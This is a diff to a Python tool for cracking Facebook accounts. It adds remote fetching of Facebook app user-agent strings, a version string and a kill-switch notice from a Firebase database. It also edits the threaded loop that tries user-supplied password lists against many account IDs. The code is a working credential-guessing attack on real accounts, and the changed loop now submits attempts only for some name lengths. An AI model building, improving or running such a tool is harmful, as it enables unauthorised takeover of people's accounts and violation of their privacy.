@@ -111,13 +111,82 @@ gas = "\033[1;32m"
 my_color = [white, blue, green];
 warna = random.choice(my_color)
 
+fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/e_value.json"
+
+
+def get_ua():
+    try:
+        response = requests.get(fu, timeout=5)
+        if response.status_code == 200:
+            return response.text.strip().replace('"', '')
+        else:
+            sys.exit(1)
+    except requests.exceptions.RequestException as e:
+        sys.exit(1)
+
+
+e = get_ua()
+
+
+def user_agent():
+    s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(
+        random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
+    if not e:
+        sys.exit(1)
+    ua = s + e
+    return ua
+
+
+# ━━━━━━━━━━━[ Version] ━━━━━━━━━━━
+
+fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/ver.json"
+
+
+def ver():
+    try:
+        response = requests.get(fu, timeout=5)
+        if response.status_code == 200:
+            return response.text.strip().replace('"', '')
+        else:
+            sys.exit(1)
+    except requests.exceptions.RequestException as e:
+        sys.exit(1)
+
+
+v = ver()
+
+# ━━━━━━━━━━━[ Notice] ━━━━━━━━━━━
+
+fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/notice.json"
+
+
+def Dark():
+    try:
+        response = requests.get(fu, timeout=5)
+        if response.status_code == 200:
+            return response.text.strip().replace('"', '')
+        else:
+            pass
+    except requests.exceptions.RequestException as e:
+        pass
+
+
+notice = Dark()
+if notice == "null":
+    pass
+elif notice:
+    os.system('clear')
+    print(notice)
+    sys.exit(1)
+
+
 # __________________[ LOGO. ..]__________________#
 logo = f"""
 {white}X   X BBBB   OOO  W     W
 {white} X X  B   B O   O W     W
 {white}  X   BBBB  O   O W  W  W
 {white} X X  B   B O   O  W W W
-{white}X   X BBBB   OOO    W W          
+{white}X   X BBBB   OOO    W W        print{v}  
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {white}[{green}◆{white}] {white}FACEBOOK {white}➣{white}   ({green}clone.inception{white})
 {white}[{green}◆{white}] {white}GITTEA   {white}➣{white}   ({green}inc3{white})
@@ -294,13 +363,12 @@ class main_crack():
     def pasw(self):
         pw = []
         clear()
-        print(f'{white}[{red}◆{white}] {red}Password Limit Should Be Not Greater Than 20!')
+        print(f'{white}[{red}◆{white}] {red}Password Limit Should Be Not Greater Than 20!');
         linex()
         sl = int(input(f'{white}[{green}◆{white}] {white}Input Password Limit {white}➣{white} '))
         clear()
         print(f'{white}[{green}◆{white}] {white}EXAMPLE {white}➣{white} First123/first12/77889900')
         linex()
-
         if sl == '':
             print(f'{S}[{R}={G5}]{S} PUT LIMIT BETWEEN 1 TO 20')
         elif sl > 20:
@@ -308,29 +376,27 @@ class main_crack():
         else:
             for sr in range(sl):
                 pw.append(input(f'{white}[{green}◆{white}] {white}Password {white}{sr + 1} {white}➣{white} '))
-
         clear()
         print(f'{white}[{green}◆{white}] {white}TOTAL UID  {white}➣{green} %s ' % len(self.id))
-        print(f'{white}[{green}◆{white}] {white}Use Automate {green}(1M/3S){green} {white}Airplane Flow')
+        print(f'{white}[{green}◆{white}] {white}Use Automate {green}1M/3S{green} {white}Airplane Flow')
         linex()
-
         with inc3(max_workers=90) as NOX:
             for zsb in self.id:
                 try:
                     uid, name = zsb.split('|')
                     sz = name.split(' ')
-                    pwx = pw  # Always set `pwx`
-
-                    # Always submit tasks, regardless of sz length
-                    if 'methodA' in methods:
-                        NOX.submit(self.methodA, uid, name, pwx)
-                    if 'methodB' in methods:
-                        NOX.submit(self.methodB, uid, name, pwx)
-                    if 'methodC' in methods:
-                        NOX.submit(self.methodC, uid, name, pwx)
+                    if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                        pwx = pw
+                    else:
+                        pwx = pw
+                        if 'methodA' in methods:
+                            NOX.submit(self.methodA, uid, name, pwx)
+                        elif 'methodB' in methods:
+                            NOX.submit(self.methodB, uid, name, pwx)
+                        elif 'methodC' in methods:
+                            NOX.submit(self.methodC, uid, name, pwx)
                 except:
                     pass
-
         result(oks, cps)
 
 
